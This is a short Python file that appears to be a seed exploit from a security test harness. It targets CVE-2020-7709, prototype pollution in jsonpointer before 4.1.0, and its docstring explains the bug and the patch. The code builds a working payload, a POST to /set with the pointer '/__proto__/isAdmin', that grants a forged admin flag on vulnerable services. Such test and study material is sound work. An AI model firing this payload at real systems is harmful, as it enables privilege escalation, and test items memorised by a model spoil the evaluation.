#!/usr/bin/env python3
r"""[GIVEN] CVE-2020-7709 seed exploit -- jsonpointer set() string-pointer prototype pollution.

real-app-http: this is fired as REAL EXTERNAL HTTP against the running Express service:
  POST /set  {"pointer": "/__proto__/isAdmin", "value": true}
then a subsequent GET /check observes whether Object.prototype was polluted. The service calls the
REAL published jsonpointer.set({}, pointer, value) on the attacker-supplied JSON -- no in-process probe.

jsonpointer < 4.1.0 (V0 = 4.0.1) `setter` has NO magic-property guard: it compiles the string
pointer "/__proto__/isAdmin" by split('/') into ['', '__proto__', 'isAdmin'] and walks the segments
FROM INDEX 1 dereferencing each natively (`obj = obj[part]`), so the segment "__proto__" makes the
walk step out of the fresh `{}` and ONTO the shared Object.prototype, and the leaf assign
`obj['isAdmin'] = true` writes onto it. A later GET /check sees `({}).isAdmin === true` -> flag.

Contract: reaches the flag on V0; BLOCKED on V1 (4.1.0). The CVE-2020-7709 fix adds at the TOP of
setter(), before the loop, `if (pointer[1] === 'constructor' && pointer[2] === 'prototype') return obj`
and `if (pointer[1] === '__proto__') return obj` -- a strict `===` STRING compare of the RAW segment
pointer[1]. For the string seed pointer[1] is exactly '__proto__', so setter early-returns before any
write (POST /set returns ok but no pollution happens) -- /check stays `null` (no flag). This is the
seed the SUT is given.
"""
from __future__ import annotations


def candidate(flag: str) -> dict:
    """A POST /set whose pointer is an all-STRING RFC-6901 `/__proto__/isAdmin` walk."""
    return {
        "probe_id": "cve-2020-7709-string-proto",
        "method": "POST",
        "path_route": "/set",
        "pointer": "/__proto__/isAdmin",
        "value": True,
    }


if __name__ == "__main__":
    print(candidate("PCBFLAG_demo"))
